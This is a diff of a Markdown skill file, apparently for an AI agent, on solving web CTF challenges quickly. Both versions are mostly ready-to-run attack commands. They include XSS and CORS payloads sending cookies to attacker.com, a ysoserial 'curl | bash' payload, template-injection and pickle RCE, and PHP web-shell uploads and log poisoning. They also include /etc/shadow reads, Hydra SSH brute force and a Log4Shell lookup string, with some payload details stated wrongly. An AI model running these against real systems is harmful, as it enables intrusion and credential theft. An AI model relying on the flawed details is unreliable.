@@ -1,607 +1,463 @@
----
-name: ctf-web
-description: "CTF web exploitation skill. When user mentions web CTF challenges, web exploitation, SQL injection, XSS, SSRF, deserialization, SSTI, race conditions, JWT attacks, CORS misconfiguration, HTTP request smuggling, or web application security testing in a CTF context. Covers all major web exploitation categories with step-by-step methodology, payloads, and tool usage."
----
+# CTF Web Exploitation Skill
 
-# CTF Web Exploitation — Challenge Solving Brain
+## Speed-First Approach: Solve web challenges in <10 minutes
 
-When solving web CTF challenges:
-1. **Enumerate first** — map the attack surface before exploiting
-2. **Check the source** — view page source, JavaScript, comments
-3. **Intercept everything** — use Burp Suite or browser dev tools
-4. **Test systematically** — follow the testing checklist
-5. **Chain findings** — low-severity bugs combine into exploits
-
----
-
-## Phase 1: Reconnaissance
-
-### Initial Survey
-```
-CHECKLIST:
-□ View page source (Ctrl+U)
-□ Check robots.txt, sitemap.xml
-□ Check /.well-known/, /security.txt
-□ Inspect JavaScript files (look for API keys, endpoints)
-□ Check HTTP response headers (X-Powered-By, Server)
-□ Test for directory listing
-□ Check for common backup files (.bak, .old, ~, .swp)
-□ Enumerate subdomains if applicable
-```
-
-### Hidden Information Discovery
+### Phase 1: Instant Recon (<2 minutes)
 ```bash
-# Directory enumeration
-gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt
-ffuf -u http://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt
+URL=$1
 
-# Parameter discovery
-arjun -u http://target.com/page
-paramspider -d target.com
+# Headers and cookies
+curl -sI $URL
+curl -sI $URL -c /tmp/cookies.txt
+
+# Quick directory check
+for f in robots.txt .git/config .env admin flag flag.txt index.html backup.zip source.zip .DS_Store .htaccess web.config sitemap.xml crossdomain.xml; do
+  code=$(curl -s -o /dev/null -w '%{http_code}' $URL/$f)
+  [ "$code" != "404" ] && echo "[+] $f → $code"
+done
+
+# Source code check
+curl -s $URL | grep -i 'flag\|hidden\|secret\|admin\|password'
+
+# Technology fingerprint
+curl -sI $URL | grep -i 'server\|x-powered-by\|set-cookie\|x-aspnet\|x-runtime'
 
 # JavaScript analysis
-linkfinder -i http://target.com -o cli
-secretfinder -i http://target.com/app.js -e
+curl -s $URL | grep -oE 'src="[^"]*\.js"' | head -10
+curl -s $URL | grep -oiE '(eval|document\.cookie|localStorage|sessionStorage)' | sort -u
 ```
 
-### Cookie and Session Analysis
+### Phase 2: Pattern Recognition (<5 minutes)
 ```
-INSPECT:
-□ Session cookie values (base64, JWT, serialized objects)
-□ Cookie encoding (hex, base64, URL encoding)
-□ Session fixation possibilities
-□ Cookie scope (path, domain, Secure, HttpOnly, SameSite)
-□ Local storage and session storage
-```
-
----
-
-## Phase 2: SQL Injection
-
-### Detection Payloads
-```sql
-' OR 1=1--
-' OR '1'='1
-" OR 1=1--
-' OR ''='
-1' OR 1=1#
-1' OR 1=1/*
-' UNION SELECT NULL--
-') OR 1=1--
+MATCH challenge to known patterns:
+├── Login form? → SQLi or default creds (30 seconds to try)
+├── User profile page? → IDOR (change user ID)
+├── File download? → Path traversal (../../../etc/passwd)
+├── Search box? → XSS or SQLi
+├── API endpoint? → Mass assignment or BOLA
+├── File upload? → Bypass extension filter
+├── Admin panel? → Force browsing or default creds
+├── JSON API? → Prototype pollution
+├── WordPress? → WPScan enumeration
+├── SSTI indicators ({{7*7}}) → Template injection
+├── JWT token? → Algorithm confusion, none attack
+├── SSRF indicator (fetch/proxy URL) → Internal network scan
+├── Race condition possible? → Concurrent requests
+└── No obvious pattern? → Directory brute force + source code review
 ```
 
-### Union-Based Extraction
-```sql
--- Step 1: Find column count
-' ORDER BY 1-- 
-' ORDER BY 2-- 
-' ORDER BY 3-- 
--- Continue until error
-
--- Step 2: Find column types
-' UNION SELECT NULL,NULL,NULL-- 
-' UNION SELECT 'a',NULL,NULL-- 
-' UNION SELECT NULL,'a',NULL-- 
-
--- Step 3: Extract data
-' UNION SELECT username,password,NULL FROM users-- 
-' UNION SELECT table_name,NULL,NULL FROM information_schema.tables-- 
-' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users'-- 
+### Phase 3: Solve and Submit
+```
+IF flag found → submit immediately
+ELSE → move to next challenge (come back later if stuck)
 ```
 
-### Blind SQL Injection
-```sql
--- Boolean-based
-' AND 1=1--    (true condition)
-' AND 1=2--    (false condition)
-' AND (SELECT LENGTH(username) FROM users WHERE username='admin')>5--
+## One-Liner Solvers
 
--- Character-by-character extraction
-' AND (SELECT SUBSTRING(username,1,1) FROM users WHERE id=1)='a'--
-' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>64--
+### SQL Injection Quick Bypass
+```bash
+# Login bypass - try all variations
+curl -s -X POST "$URL/login" \
+  -d "username=admin'--&password=anything" \
+  -d "username=admin'%23&password=anything" \
+  -d "username=admin'/*&password=anything*/" \
+  -d "username=admin'||'1'='1&password=anything" \
+  -d "username=admin' OR '1'='1&password=anything"
 
--- Time-based
-' AND SLEEP(5)--
-' AND IF(1=1,SLEEP(5),0)--
-' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)--
+# SQLi in parameter - quick test
+curl -s "$URL/page?id=1' OR '1'='1"
+curl -s "$URL/page?id=1' OR '1'='1'--"
+curl -s "$URL/page?id=1' OR '1'='1'/*"
 ```
+
+### IDOR Enumeration
+```bash
+# Try different ID formats
+for id in {1..50} admin root test user administrator; do
+  curl -s "$URL/api/user/$id" | grep -v 'error\|null' | head -1
+done
+
+# Try IDOR with different keys
+for key in id user_id uid userid account_id; do
+  curl -s "$URL/api?$key=1" | head -1
+done
+```
+
+### LFI Traversal
+```bash
+# Quick LFI test
+for path in "../" "../../" "../../../" "../../../../"; do
+  curl -s "$URL/?page=${path}etc/passwd" | grep -q root && echo "LFI with $path"
+done
+
+# PHP filter (get source code)
+curl -s "$URL/?page=php://filter/convert.base64-encode/resource=index.php" | base64 -d
+
+# Common LFI paths
+for f in /etc/passwd /etc/shadow /etc/hosts /proc/self/environ /proc/version; do
+  curl -s "$URL/?page=../../../../../../$f" | head -3
+done
+
+# LFI to RCE via log poisoning
+curl -s "$URL/?page=/var/log/apache2/access.log"  # Check if logs accessible
+curl -s -H "User-Agent: <?php system(\$_GET['c']); ?>" "$URL/?page=/var/log/apache2/access.log"  # Poison log
+curl -s "$URL/?page=/var/log/apache2/access.log&c=id"  # Execute command
+```
+
+### XSS Detection
+```bash
+# Quick XSS test
+curl -s "$URL/search?q=<script>alert(1)</script>" | grep -o '<script>alert(1)</script>'
+
+# Check for DOM XSS sources
+curl -s $URL | grep -oE '(location\.hash|document\.URL|document\.referrer|window\.name|document\.cookie)' | sort -u
+
+# Check for reflected parameters
+curl -s "$URL/?test=PROBE123" | grep -q PROBE123 && echo "Reflected parameter found"
+```
+
+### File Upload Bypass
+```bash
+# Try different extensions
+for ext in php php3 php4 php5 phtml pht phar; do
+  echo "<?php system(\$_GET['c']); ?>" > shell.$ext
+  curl -s -F "file=@shell.$ext" $URL/upload | head -1
+done
+
+# Try Content-Type bypass
+curl -s -F "file=@shell.php;type=image/jpeg" $URL/upload
+
+# Try double extension
+curl -s -F "file=@shell.php.jpg" $URL/upload
+
+# Try null byte
+curl -s -F "file=@shell.php%00.jpg" $URL/upload
+```
+
+## Fast Attack Templates
 
 ### SQLMap Automation
 ```bash
-# Basic detection
-sqlmap -u "http://target.com/page?id=1" --batch
+# Quick SQLi test and dump
+sqlmap -u "$URL/?id=1" --batch --dump --threads=10 --risk=3 --level=3
 
-# With POST data
-sqlmap -u "http://target.com/login" --data="user=admin&pass=test" --batch
+# Login form SQLi
+sqlmap -u "$URL/login" --data="username=admin&password=pass" \
+  --batch --dump --threads=10
 
-# Enumerate databases
-sqlmap -u "http://target.com/page?id=1" --dbs --batch
-
-# Dump specific table
-sqlmap -u "http://target.com/page?id=1" -D mydb -T users --dump --batch
+# With cookie (authenticated)
+sqlmap -u "$URL/?id=1" --cookie="session=abc123" --batch --dump
 
 # OS shell
-sqlmap -u "http://target.com/page?id=1" --os-shell --batch
+sqlmap -u "$URL/?id=1" --os-shell --batch
 
-# Custom headers/cookies
-sqlmap -u "http://target.com/page?id=1" --cookie="session=abc" --headers="X-Auth: token" --batch
+# Read file
+sqlmap -u "$URL/?id=1" --file-read=/etc/passwd --batch
 ```
 
-### WAF Bypass Techniques
-```sql
--- Case variation
-' UnIoN SeLeCt 1,2,3--
-
--- Inline comments
-/**/UNION/**/SELECT/**/1,2,3--
-
--- Encoding
-' UNION SELECT 1,2,3--    (URL encode: %27%20UNION%20SELECT%201%2C2%2C3--)
-
--- Alternative syntax
-' UNION ALL SELECT 1,2,3-- 
-' INTERSECT SELECT 1,2,3-- 
-
--- Parameter pollution
-id=1' UNION SELECT NULL--&id=1
-```
-
----
-
-## Phase 3: Cross-Site Scripting (XSS)
-
-### Reflected XSS Payloads
-```html
-<script>alert(1)</script>
-<script>alert(document.domain)</script>
-<img src=x onerror=alert(1)>
-<svg onload=alert(1)>
-<body onload=alert(1)>
-<input onfocus=alert(1) autofocus>
-<marquee onstart=alert(1)>
-<details open ontoggle=alert(1)>
-<video src=x onerror=alert(1)>
-<audio src=x onerror=alert(1)>
-<iframe src="javascript:alert(1)">
-```
-
-### Stored XSS
-```html
-<!-- In user profile, comments, forums -->
-<script>fetch('http://attacker.com/steal?c='+document.cookie)</script>
-<img src=x onerror="fetch('http://attacker.com/steal?c='+document.cookie)">
-<svg onload="new Image().src='http://attacker.com/steal?c='+document.cookie">
-```
-
-### DOM-Based XSS
-```javascript
-// Check these sources
-document.URL
-document.documentURI
-document.referrer
-window.name
-location.hash
-location.search
-document.cookie
-
-// Check these sinks
-document.write()
-element.innerHTML
-element.outerHTML
-eval()
-setTimeout()
-setInterval()
-document.location
-window.location
-```
-
-### Filter Bypass
-```html
-<!-- Case bypass -->
-<ScRiPt>alert(1)</sCrIpT>
-
-<!-- No parentheses -->
-<script>alert`1`</script>
-
-<!-- Without alert -->
-<script>confirm(1)</script>
-<script>prompt(1)</script>
-<script>print()</script>
-
-<!-- Encoding -->
-<script>eval(atob('YWxlcnQoMSk='))</script>
-<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
-
-<!-- SVG -->
-<svg><script>alert(1)</script></svg>
-
-<!-- Event handlers -->
-<details open ontoggle=alert(1)>
-<img src=x onerror=alert(1)>
-```
-
-### XSS Cheatsheet
+### ffuf Speed Scan
 ```bash
-# Reflected XSS testing
-dalfox url "http://target.com/search?q=test" --blind yoursrv.xss.ht
+# Common web files (fast)
+ffuf -u $URL/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200,301,302,403 -s
 
-# DOM XSS
-python3 -c "
-import urllib.parse
-payload = '<script>alert(1)</script>'
-print('URL-encoded:', urllib.parse.quote(payload))
-print('Double-encoded:', urllib.parse.quote(urllib.parse.quote(payload)))
-"
+# Directory listing
+ffuf -u $URL/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt -mc 200 -s
+
+# Parameter discovery
+ffuf -u "$URL/?FUZZ=test" -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -mc 200 -fs 0
+
+# Subdomain enumeration
+ffuf -u http://FUZZ.$DOMAIN -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -mc 200 -fs 0
 ```
 
----
-
-## Phase 4: Server-Side Request Forgery (SSRF)
-
-### Detection
-```
-TEST THESE INPUTS:
-□ URL parameters (url, link, src, href, redirect)
-□ File upload via URL
-□ Webhook/callback URLs
-□ PDF/image generation endpoints
-□ RSS feed URLs
-□ API proxy endpoints
-```
-
-### Internal Service Discovery
-```
-CLOUD METADATA URLS:
-AWS:     http://169.254.169.254/latest/meta-data/
-GCP:     http://metadata.google.internal/computeMetadata/v1/
-Azure:   http://169.254.169.254/metadata/instance?api-version=2021-02-01
-
-INTERNAL SERVICES:
-http://localhost:8080
-http://127.0.0.1:3000
-http://internal-service:8080
-http://[::1]:8080
-
-FILE PROTOCOL:
-file:///etc/passwd
-file:///proc/self/environ
-file:///proc/self/cmdline
-```
-
-### Bypass Techniques
-```
-BYPASS 1: IP address encoding
-http://0x7f000001/
-http://0177.0.0.1/
-http://2130706433/
-http://0x7f.0x00.0x00.0x01/
-
-BYPASS 2: DNS rebinding
-Host DNS that resolves to external first, then internal
-
-BYPASS 3: Redirect follow
-Host a server that redirects to http://169.254.169.254/
-
-BYPASS 4: IPv6
-http://[0:0:0:0:0:ffff:127.0.0.1]/
-http://[::1]/
-
-BYPASS 5: Decimal/Octal
-http://0177.0.0.1/     (octal)
-http://127.1/           (省略 zero)
-
-BYPASS 6: Case variation
-http://LOCALHOST/
-http://127.0.0.1/
-```
-
-### SSRF Exploitation Chain
+### Hydra Brute Force
 ```bash
-# Step 1: Confirm SSRF
-curl "http://target.com/fetch?url=http://httpbin.org/ip"
+# Login brute force
+hydra -l admin -P /usr/share/wordlists/rockyou.txt $URL http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"
 
-# Step 2: Internal scan
-for port in 80 443 3000 8080 8443; do
-    curl -s -o /dev/null -w "%{http_code}" "http://target.com/fetch?url=http://127.0.0.1:$port"
+# SSH brute force
+hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://$URL
+```
+
+### Nikto Quick Scan
+```bash
+nikto -h $URL -Tuning x6 -maxtime 60s
+nikto -h $URL -Plugin robots
+nikto -h $URL -Plugin cgi
+```
+
+## OWASP Top 10 Quick Checks
+
+### A01: Broken Access Control
+```bash
+# Force browsing to admin pages
+for path in /admin /admin/ /dashboard /panel /manage /console /debug /api/admin; do
+  code=$(curl -s -o /dev/null -w '%{http_code}' "$URL$path")
+  [ "$code" != "404" ] && echo "[+] $path → $code"
 done
 
-# Step 3: Cloud metadata
-curl "http://target.com/fetch?url=http://169.254.169.254/latest/meta-data/"
-curl "http://target.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+# IDOR on different endpoints
+for endpoint in /api/user/ /api/users/ /api/account/ /api/profile/; do
+  for id in 1 2 3 admin; do
+    curl -s "$URL$endpoint$id" | grep -v 'error\|null' | head -1
+  done
+done
 ```
 
----
-
-## Phase 5: Server-Side Template Injection (SSTI)
-
-### Detection
-```
-TEST PAYLOADS:
-{{7*7}}       → Should return 49
-${7*7}        → Should return 49
-<%= 7*7 %>    → Should return 49
-#{7*7}        → Should return 49
-<% 7*7 %>     → Should return 49
-```
-
-### Engine Identification
-```
-{{7*7}} = 49    → Twig, Jinja2, Nunjucks
-${7*7} = 49     → FreeMarker, Velocity
-#{7*7} = 49     → Ruby ERB, Smarty
-<%= 7*7 %> = 49 → EJS, Jade/Pug
-```
-
-### Jinja2 Exploitation
-```python
-# Read file
-{{ ''.__class__.__mro__[1].__subclasses__() }}
-{{ config.items() }}
-{{ self.__init__.__globals__['os'].popen('id').read() }}
-
-# RCE via os module
-{{ ''.__class__.__mro__[1].__subclasses__()[X].__init__.__globals__['__builtins__']['__import__']('os').popen('cat /etc/passwd').read() }}
-
-# Using lipsum
-{{ lipsum.__globals__['os'].popen('id').read() }}
-{{ lipsum.__globals__['__builtins__']['__import__']('os').popen('id').read() }}
-
-# Using cycler/joiner/namespace
-{{ cycler.__init__.__globals__.os.popen('id').read() }}
-{{ joiner.__init__.__globals__.os.popen('id').read() }}
-{{ namespace.__init__.__globals__.os.popen('id').read() }}
-```
-
-### Twig Exploitation
-```php
-// RCE
-{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
-{{['ls']|filter('system')}}
-```
-
-### Tool
+### A02: Cryptographic Failures
 ```bash
-# SSTI detection and exploitation
-python3 -c "
-import requests
-payloads = ['{{7*7}}', '${7*7}', '<%= 7*7 %>', '#{7*7}']
-for p in payloads:
-    r = requests.get('http://target.com/page', params={'input': p})
-    if '49' in r.text:
-        print(f'Vulnerable to: {p}')
-"
+# Check for weak hashing
+curl -s $URL/robots.txt | grep -i 'md5\|sha1\|des'
+
+# Check for hardcoded credentials in source
+curl -s $URL | grep -i 'password\|secret\|key\|token' | grep -v 'placeholder\|example'
 ```
 
----
-
-## Phase 6: Deserialization Attacks
-
-### PHP Deserialization
-```php
-// Object injection
-O:4:"User":2:{s:4:"name";s:5:"admin";s:4:"role";s:5:"admin";}
-
-// Phar deserialization (file upload)
-php -d phar.readonly=0 -r "
-\$p = new Phar('test.phar');
-\$p->startBuffering();
-\$p->setStub('<?php __HALT_COMPILER();');
-\$o = new User();
-\$o->name = 'admin';
-\$p->addFromString('test.txt', 'test');
-\$p->setMetadata(\$o);
-\$p->stopBuffering();
-echo base64_encode(file_get_contents('test.phar'));
-"
-```
-
-### Java Deserialization
+### A03: Injection
 ```bash
-# Generate payload with ysoserial
-java -jar ysoserial.jar CommonsCollections1 "curl http://attacker.com/shell.sh | bash" | base64
+# Command injection quick test
+curl -s "$URL/?cmd=;id" | grep -i 'uid='
+curl -s "$URL/?cmd=|id"
+curl -s "$URL/?cmd=\$(id)"
 
-# Detect serialization
-echo -n "rO0AB" | base64 -d  # Java serialized objects start with aced0005
-strings binary | grep "rO0AB"
+# LDAP injection
+curl -s "$URL/login" -d "username=*)(objectClass=*)&password=x"
+
+# NoSQL injection
+curl -s "$URL/login" -H "Content-Type: application/json" \
+  -d '{"username":{"$gt":""},"password":{"$gt":""}}'
 ```
 
-### Python Deserialization
-```python
-# pickle RCE
-import pickle
-import os
-
-class Exploit(object):
-    def __reduce__(self):
-        return (os.system, ('id',))
-
-payload = pickle.dumps(Exploit())
-print(payload.hex())
-
-# base64 encode
-import base64
-print(base64.b64encode(payload).decode())
-```
-
----
-
-## Phase 7: JWT Attacks
-
-### JWT Structure
-```
-Header.Payload.Signature
-eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.signature
-
-Header: {"alg":"HS256","typ":"JWT"}
-Payload: {"user":"admin","iat":1234567890}
-```
-
-### Common Attacks
+### A05: Security Misconfiguration
 ```bash
-# 1. None algorithm attack
-# Change header: {"alg":"none","typ":"JWT"}
-# Remove signature, keep trailing dot
+# Check for default credentials
+for cred in "admin:admin" "admin:password" "admin:123456" "root:root" "test:test"; do
+  user=$(echo $cred | cut -d: -f1)
+  pass=$(echo $cred | cut -d: -f2)
+  curl -s -X POST "$URL/login" -d "username=$user&password=$pass" | grep -v 'incorrect\|invalid'
+done
 
-# 2. Weak secret (brute force)
-hashcat -m 16500 jwt.txt wordlist.txt
-john jwt.txt --wordlist=rockyou.txt --format=HMAC-SHA256
-
-# 3. Key confusion (RS256 → HS256)
-# Use public key as HMAC secret
-openssl rsa -in pubkey.pem -pubin -outform PEM > pubkey_plain.pem
-python3 -c "
-import hmac, hashlib, base64, json
-header = base64.urlsafe_b64encode(json.dumps({'alg':'HS256','typ':'JWT'}).encode()).rstrip(b'=')
-payload = base64.urlsafe_b64encode(json.dumps({'user':'admin'}).encode()).rstrip(b'=')
-sig = base64.urlsafe_b64encode(hmac.new(open('pubkey_plain.pem').read().encode(), header+b'.'+payload, hashlib.sha256).digest()).rstrip(b'=')
-print(f'{header.decode()}.{payload.decode()}.{sig.decode()}')
-"
-
-# 4. JKU/X5U header injection
-# Modify jku to point to attacker-controlled key file
+# Check for verbose error messages
+curl -s "$URL/nonexistent" | grep -i 'error\|exception\|stack trace'
 ```
 
-### JWT Tool
+### A07: Authentication Failures
 ```bash
-# jwt_tool
-python3 jwt_tool.py JWT_TOKEN -C -d wordlist.txt
-python3 jwt_tool.py JWT_TOKEN -X a    # Test all attacks
+# Test for username enumeration
+curl -s -X POST "$URL/login" -d "username=admin&password=wrong" > /tmp/admin.txt
+curl -s -X POST "$URL/login" -d "username=nonexistent&password=wrong" > /tmp/fake.txt
+diff /tmp/admin.txt /tmp/fake.txt
+
+# Rate limiting test
+for i in $(seq 1 10); do
+  curl -s -X POST "$URL/login" -d "username=admin&password=wrong" -o /dev/null -w '%{http_code}\n'
+done
 ```
 
----
-
-## Phase 8: Race Conditions
-
-### Detection
-```
-TEST FOR RACE CONDITIONS:
-□ Coupon redemption
-□ Balance transfers
-□ Vote submission
-□ Account creation
-□ File upload
-□ Password reset
-```
-
-### Exploitation
+### A08: Software and Data Integrity Failures
 ```bash
-# Burp Suite Intruder with pitchfork
-# Send N concurrent requests with same resource
+# Check for outdated software
+curl -sI $URL | grep -i 'server\|x-powered-by'
 
-# Turbo Intruder
-python3 -c "
-import requests
-import threading
+# Check for known vulnerable paths
+for path in /wp-login.php /wp-admin/ /administrator/ /phpmyadmin/ /admin.php; do
+  code=$(curl -s -o /dev/null -w '%{http_code}' "$URL$path")
+  [ "$code" != "404" ] && echo "[+] $path → $code"
+done
+```
 
-def exploit():
-    requests.post('http://target.com/redeem', data={'code': 'COUPON123'})
+### A10: Server-Side Request Forgery (SSRF)
+```bash
+# Quick SSRF test
+curl -s "$URL/fetch?url=http://127.0.0.1:22"
+curl -s "$URL/proxy?target=http://169.254.169.254/latest/meta-data/"
+curl -s "$URL/ssrf?url=http://localhost:3306"
 
-threads = [threading.Thread(target=exploit) for _ in range(20)]
-for t in threads: t.start()
-for t in threads: t.join()
-"
+# DNS rebinding
+curl -s "$URL/fetch?url=http://rebind.nu"
+```
 
-# curl multi
+## Advanced Web Attack Patterns
+
+### JWT Attacks
+```bash
+# None algorithm attack
+echo -n '{"alg":"none","typ":"JWT"}' | base64 -w0 | tr '+/' '-_'
+echo -n '{"user":"admin"}' | base64 -w0 | tr '+/' '-_'
+
+# Weak secret (brute force)
+hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
+
+# Key confusion (RS256 → HS256)
+openssl rsa -pubin -in pubkey.pem -outform PEM > pubkey.pem.txt
+hashcat -m 16500 jwt.txt pubkey.pem.txt
+```
+
+### Prototype Pollution
+```bash
+curl -s -X POST "$URL/api/merge" \
+  -H "Content-Type: application/json" \
+  -d '{"__proto__":{"isAdmin":true}}'
+
+curl -s "$URL/api/user?__proto__[isAdmin]=true"
+```
+
+### SSTI (Server-Side Template Injection)
+```bash
+# Quick SSTI test
+curl -s "$URL/?name={{7*7}}"
+curl -s "$URL/?name=${7*7}"
+curl -s "$URL/?name=<%= 7*7 %>"
+
+# If 49 is returned, it's vulnerable
+# Jinja2: {% import os %}{{ os.popen('id').read() }}
+# Twig: {{ _self.env.registerUndefinedFilterCallback("exec") }}{{ _self.env.getFilter("id") }}
+```
+
+### Race Conditions
+```bash
+# Quick race condition test
 for i in $(seq 1 20); do
-    curl -s -X POST http://target.com/redeem -d "code=COUPON123" &
+  curl -s -X POST "$URL/redeem" -d "code=GIFT" &
 done
 wait
 ```
 
----
-
-## Phase 9: CORS Misconfiguration
-
-### Detection
+### File Upload to RCE
 ```bash
-# Test CORS
-curl -H "Origin: http://evil.com" http://target.com/api/data -v
-# Check for Access-Control-Allow-Origin: http://evil.com
-# Check for Access-Control-Allow-Credentials: true
+# GIF89a header bypass
+echo "GIF89a<?php system(\$_GET['c']); ?>" > shell.php
+curl -s -F "file=@shell.php" $URL/upload
 
-# Test with null origin
-curl -H "Origin: null" http://target.com/api/data -v
+# Double extension
+cp shell.php shell.php.jpg
+curl -s -F "file=@shell.php.jpg" $URL/upload
+
+# .htaccess upload
+echo "AddType application/x-httpd-php .jpg" > .htaccess
+curl -s -F "file=@.htaccess" $URL/upload
+curl -s -F "file=@shell.jpg" $URL/upload
+curl -s "$URL/uploads/shell.jpg?c=id"
 ```
 
-### Exploitation
-```html
-<!-- Host on attacker.com -->
-<script>
-var xhr = new XMLHttpRequest();
-xhr.open("GET", "http://target.com/api/user", true);
-xhr.withCredentials = true;
-xhr.onreadystatechange = function() {
-    if (xhr.readyState == 4) {
-        fetch("http://attacker.com/log?data=" + btoa(xhr.responseText));
-    }
-};
-xhr.send();
-</script>
-```
-
----
-
-## Phase 10: HTTP Request Smuggling
-
-### CL.TE
-```
-POST / HTTP/1.1
-Host: target.com
-Content-Length: 6
-Transfer-Encoding: chunked
-
-0
-
-X
-```
-
-### TE.CL
-```
-POST / HTTP/1.1
-Host: target.com
-Content-Length: 3
-Transfer-Encoding: chunked
-
-8
-SMUGGLED
-0
-```
-
-### Detection
+### WordPress Attacks
 ```bash
-# Send request with conflicting headers
-curl -X POST http://target.com/ \
-  -H "Transfer-Encoding: chunked" \
-  -H "Content-Length: 6" \
-  -d "0\r\n\r\nX"
+# WPScan enumeration
+wpscan --url $URL --enumerate vp,vt,u
 
-# Use Burp Suite HTTP Request Smuggler extension
+# Default creds
+wpscan --url $URL --passwords /usr/share/wordlists/rockyou.txt --usernames admin
+
+# XML-RPC brute force
+wpscan --url $URL --passwords /usr/share/wordlists/rockyou.txt --usernames admin --wp-content-dir wp-content
 ```
 
----
+## Speed Hacks
 
-## Quick Reference: Tool Commands
-
+### Parallel Requests
 ```bash
-# Burp Suite
-# Proxy → HTTP history, Repeater, Intruder
-
-# sqlmap
-sqlmap -u URL --batch --dbs
-sqlmap -u URL --batch -D db --tables
-sqlmap -u URL --batch -D db -T table --dump
-
-# dalfox (XSS)
-dalfox url "URL?q=test" --blind callback
-
-# ffuf (directory/parameter fuzzing)
-ffuf -u URL/FUZZ -w wordlist.txt
-ffuf -u URL -w params.txt -FUZZ
-
-# wfuzz
-wfuzz -c -z file,wordlist.txt URL/FUZZ
+# Run multiple checks simultaneously
+(echo "=== robots ===" && curl -s $URL/robots.txt) &
+(echo "=== .git ===" && curl -s $URL/.git/config) &
+(echo "=== admin ===" && curl -s -o /dev/null -w '%{http_code}' $URL/admin) &
+(echo "=== env ===" && curl -s $URL/.env) &
+wait
 ```
 
----
+### Cookie Session Management
+```bash
+curl -s -c cookies.txt -b cookies.txt $URL/login -d "username=admin&password=admin"
+curl -s -b cookies.txt $URL/admin/dashboard
+```
 
-**Remember:** Web challenges are about understanding the full request/response cycle. Intercept, modify, replay. Every parameter is a potential injection point. Every response is a clue.
+### Quick Encoding/Decoding
+```bash
+# URL decode
+python3 -c "import urllib.parse; print(urllib.parse.unquote('%7B%22flag%22%3A%22test%22%7D'))"
+
+# HTML decode
+python3 -c "import html; print(html.unescape('&lt;script&gt;'))"
+
+# Base64 decode
+echo "eyJmbGFnIjoiVEVTVCJ9" | base64 -d
+
+# JWT decode (without verification)
+echo "eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.signature" | cut -d. -f2 | base64 -d
+```
+
+## CTF Web Pattern Database
+
+### Pattern: Login + Admin Access
+```
+Approach:
+1. SQLi on login form (admin'-- OR admin' OR '1'='1)
+2. Default credentials (admin:admin, admin:password, admin:123456)
+3. IDOR on password reset (change email parameter)
+4. Bruteforce (hydra with common passwords)
+5. Cookie manipulation (role=admin, isAdmin=true)
+```
+
+### Pattern: File Download + Flag
+```
+Approach:
+1. Path traversal (../../../etc/passwd, ../../flag.txt)
+2. Symlink attack (if upload available)
+3. PHP filter (php://filter/convert.base64-encode/resource=flag.php)
+4. ZIP slip (upload malicious zip)
+```
+
+### Pattern: User Enumeration
+```
+Approach:
+1. Compare responses for existing vs non-existing users
+2. Timing differences (hashing takes longer for valid users)
+3. Error messages differ
+4. Try IDOR on user endpoints
+```
+
+### Pattern: WAF Detection + Bypass
+```
+Approach:
+1. Detect WAF: curl -s -I $URL | grep -i 'waf\|cloudflare\|akamai'
+2. Bypass techniques:
+   - Case variation: SeLeCt instead of SELECT
+   - Comments: SEL/**/ECT instead of SELECT
+   - Encoding: %53%45%4C%45%43%54
+   - Double encoding: %2553%2545%254C%2545%2543%2554
+   - Alternative syntax: /*!50000SELECT*/ instead of SELECT
+   - Parameter pollution: id=1&id=1' OR '1'='1
+```
+
+### Pattern: CVE Exploitation
+```
+Detection: Check server version headers
+Common CVEs in CTFs:
+- Log4Shell (CVE-2021-44228): ${jndi:ldap://attacker.com}
+- WinRAR (CVE-2023-38831): Crafted archive with script
+- Openfire (CVE-2023-32315): Admin console RCE
+- Confluence (CVE-2023-22515): Authentication bypass
+- Spring4Shell (CVE-2022-22965): Java deserialization
+```
+
+### Pattern: Malware Delivery Vectors
+```
+Phishing email indicators:
+- Macro-enabled Office documents (.docm, .xlsm)
+- LNK files masquerading as documents
+- Password-protected archives (password in email)
+- Double extensions (document.pdf.exe)
+- USB drops with autorun
+```
+
+## Speed Metrics
+```
+Average solve times (target):
+- SQL injection login bypass: <2 minutes
+- IDOR enumeration: <5 minutes
+- Path traversal: <3 minutes
+- XSS reflected: <2 minutes
+- File upload bypass: <5 minutes
+- JWT attack: <10 minutes
+- SSRF: <5 minutes
+- Complex chain: <15 minutes
+```
